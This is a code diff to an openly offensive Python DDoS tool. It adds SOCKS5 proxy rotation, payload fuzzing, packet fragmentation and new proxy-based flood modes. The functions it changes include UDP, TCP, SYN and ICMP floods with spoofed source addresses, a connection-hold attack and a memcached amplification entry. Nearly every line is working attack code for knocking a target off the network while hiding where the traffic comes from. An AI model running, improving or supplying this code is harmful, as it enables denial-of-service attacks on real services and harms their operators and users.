@@ -6,6 +6,7 @@ import random
 import time
 import sys
 import os
+import socks
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP, TCP, UDP
 from scapy.layers.dns import DNS, DNSQR
@@ -13,8 +14,8 @@ from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-MAX_THREADS = 1000000
-MAX_PROCESSES = 5000
+MAX_THREADS = 3000
+MAX_PROCESSES = 600
 
 # --- Basic L4 Attacks ---
 def random_ip():
@@ -23,43 +24,74 @@ def random_ip():
 def random_port():
     return random.randint(1024, 65535)
 
+def connect_with_socks(ip, port, proxy):
+    host, proxy_port = proxy.split(":")
+    sock = socks.socksocket()
+    sock.set_proxy(socks.SOCKS5, host, int(proxy_port))
+    sock.settimeout(3)
+    sock.connect((ip, port))
+    return sock
+
+def fuzz_payload(base_payload, fuzz_factor=0.2):
+    fuzzed = bytearray(base_payload)
+    num_fuzz = int(len(fuzzed) * fuzz_factor)
+    for _ in range(num_fuzz):
+        index = random.randint(0, len(fuzzed) - 1)
+        fuzzed[index] = random.randint(0, 255)
+    return bytes(fuzzed)
+
 def udp_flood(ip, port, duration):
-    timeout = time.time() + duration
     print("[*] Enhanced UDP flood engaged.")
-    
+    timeout = time.time() + duration
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
             spoofed_port = random_port()
             payload_size = random.randint(600, 1400)
             headers = [
-                b'\x00\x01\x00\x00\x00\x01',  # Fake DNS
-                b'\x1c\x03\x01' + os.urandom(32),  # QUIC style
-                b'\x17\x00\x03\x2a' + b'\x00' * 4  # NTP
+                b'\x00\x01\x00\x00\x00\x01',  
+                b'\x1c\x03\x01' + os.urandom(32),  
+                b'\x17\x00\x03\x2a' + b'\x00' * 4  
             ]
             payload = random.choice(headers) + os.urandom(payload_size)
             
             packet = IP(src=spoofed_ip, dst=ip) / UDP(sport=spoofed_port, dport=port) / Raw(load=payload)
-            send(packet, verbose=0)
+            frag1 = packet.copy()
+            frag2 = packet.copy()
+            frag_len = int(len(payload) * 0.6)
+            frag1[Raw].load = payload[:frag_len]
+            frag2[Raw].load = payload[frag_len:]
+
+            send(frag1, verbose=0)
+            send(frag2, verbose=0)
         except Exception:
             continue
 
 def tcp_flood(ip, port, duration):
+    print("[*] Enhanced TCP flood engaged.")
     timeout = time.time() + duration
     flags = ['S', 'A', 'F', 'P', 'R', 'U']
     fake_headers = [
         b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
-        b"POST /login HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 32\r\n\r\n" + os.urandom(32),
-        b"\x16\x03\x01" + os.urandom(48)  
+        b"POST /api/login HTTP/1.1\r\nHost: login.com\r\nContent-Length: 42\r\n\r\nusername=admin&password=" + os.urandom(16),
+        b"\x16\x03\x01" + os.urandom(48),  
+        b"USER anonymous\r\nPASS anonymous@\r\n",  
+        b"EHLO example.com\r\nMAIL FROM:<user@example.com>\r\n",  
+        b"\x00\x00\x10" + os.urandom(20),  
     ]
-    print("[*] Enhanced TCP flood engaged.")
-    
+    proxies = load_proxies()
     while time.time() < timeout:
+        proxy = random.choice(proxies) if proxies else None
         try:
+            if proxy:
+                s = connect_with_socks(ip, port, proxy)
+                s.send(os.urandom(random.randint(512, 1024)))
+                s.close()
             spoofed_ip = random_ip()
             sport = random_port()
             flag = random.choice(flags)
-            payload = random.choice(fake_headers) + os.urandom(random.randint(16, 128))
+            raw_base = random.choice(fake_headers) + os.urandom(random.randint(16, 128))
+            payload = fuzz_payload(raw_base, fuzz_factor=0.25)
             packet = IP(src=spoofed_ip, dst=ip, ttl=random.randint(32, 255)) / \
                      TCP(sport=sport, dport=port, flags=flag, window=random.randint(1024, 65535)) / \
                      Raw(load=payload)
@@ -67,11 +99,28 @@ def tcp_flood(ip, port, duration):
         except Exception:
             continue
 
-def syn_flood(ip, port, duration):
+def tcp_flood_proxy(ip, port, duration, proxies):
     timeout = time.time() + duration
-    print("[*] Starting smart SYN flood...")
     while time.time() < timeout:
+        proxy = random.choice(proxies)
         try:
+            s = connect_with_socks(ip, port, proxy)
+            s.send(os.urandom(random.randint(512, 1024)))
+            s.close()
+        except:
+            pass
+
+def syn_flood(ip, port, duration):
+    print("[*] Starting smart SYN flood...")
+    timeout = time.time() + duration
+    proxies = load_proxies()
+    while time.time() < timeout:
+        proxy = random.choice(proxies) if proxies else None
+        try:
+            if proxy:
+                s = connect_with_socks(ip, port, proxy)
+                s.send(os.urandom(random.randint(512, 1024)))
+                s.close()
             spoofed_ip = random_ip()
             sport = random_port()
             ttl = random.randint(32, 255)
@@ -82,10 +131,20 @@ def syn_flood(ip, port, duration):
         except Exception as e:
             pass
 
-def icmp_flood(ip, duration):
+def syn_flood_proxy(ip, port, duration, proxies):
     timeout = time.time() + duration
+    while time.time() < timeout:
+        proxy = random.choice(proxies)
+        try:
+            s = connect_with_socks(ip, port, proxy)
+            s.send(os.urandom(random.randint(512, 1024)))
+            s.close()
+        except:
+            pass
+
+def icmp_flood(ip, duration):
     print("[*] Stealth ICMP flood with payload spoofing.")
-    
+    timeout = time.time() + duration
     while time.time() < timeout:
         try:
             spoofed_ip = random_ip()
@@ -104,8 +163,8 @@ def icmp_flood(ip, duration):
 # --- PROXY-BASED ---
 
 def cps_attack(ip, port, duration, proxies):
-    timeout = time.time() + duration
     print("[*] Starting connection-per-second attack via proxies...")
+    timeout = time.time() + duration
     while time.time() < timeout:
         for proxy in proxies:
             try:
@@ -116,8 +175,8 @@ def cps_attack(ip, port, duration, proxies):
             except: pass
 
 def connection_hold(ip, port, duration, proxies):
-    timeout = time.time() + duration
     print("[*] Starting connection hold attack via proxies...")
+    timeout = time.time() + duration
     while time.time() < timeout:
         for proxy in proxies:
             try:
@@ -251,6 +310,8 @@ if __name__ == "__main__":
         "udp": udp_flood,
         "syn": syn_flood,
         "icmp": icmp_flood,
+        "tcp_proxy": lambda i, p, d, pr: tcp_flood_proxy(i, p, d, pr),
+        "syn_proxy": lambda i, p, d, pr: syn_flood_proxy(i, p, d, pr),
         "cps": lambda i, p, d, pr: cps_attack(i, p, d, pr),
         "connection": lambda i, p, d, pr: connection_hold(i, p, d, pr),
         "mem": memcached_amp,
